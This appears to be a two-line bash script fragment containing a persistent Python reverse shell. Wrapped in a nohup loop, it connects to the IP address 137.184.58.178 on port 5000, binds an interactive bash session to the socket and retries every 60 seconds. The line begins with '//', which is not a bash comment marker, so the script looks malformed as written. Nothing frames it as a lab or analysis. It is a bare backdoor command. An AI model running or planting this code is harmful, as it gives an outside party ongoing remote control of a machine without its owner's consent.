#!/bin/bash
// nohup sh -c 'while true; do python3 -c '\''import socket,subprocess,os;s=socket.socket();s.connect(("137.184.58.178",5000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])'\''; sleep 60; done' &
